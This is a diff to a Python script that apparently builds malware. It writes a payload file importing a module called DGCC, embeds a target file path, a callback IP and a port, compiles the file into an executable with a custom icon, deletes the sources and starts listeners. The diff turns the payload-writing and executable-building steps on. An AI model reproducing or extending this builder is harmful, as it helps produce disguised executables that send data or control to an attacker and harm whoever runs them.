@@ -114,12 +114,14 @@ def console():
 def payload(fp, name, Ip, port):
     with open(str(name) + ".py", "w") as f:
         f.write("""
+import DGCC
 
 filepath = """ +  " r'"  +str(fp) +  "' " + """
 Targetip = """ +  " '" + str(Ip) + "' " +"""
 port = """ + str(port) + """
 
 """)
+
 
 
 def makeexe(name, icon):
@@ -131,7 +133,6 @@ def makeexe(name, icon):
 
     os.remove(str(name) + '.py')
     os.remove(str(name) + '.spec')
-    #sleep(10)
     #os.rmdir('/build')
     #os.rmdir('/__pycache__')
 
@@ -143,6 +144,6 @@ def liseners(ip, port):
 
 if __name__ == '__main__':
     (filepath, name, Ip, port, icon) = console()
-    #payload(filepath, name, Ip, port)
-    #makeexe(name, icon)
+    payload(filepath, name, Ip, port)
+    makeexe(name, icon)
     liseners(Ip, port)
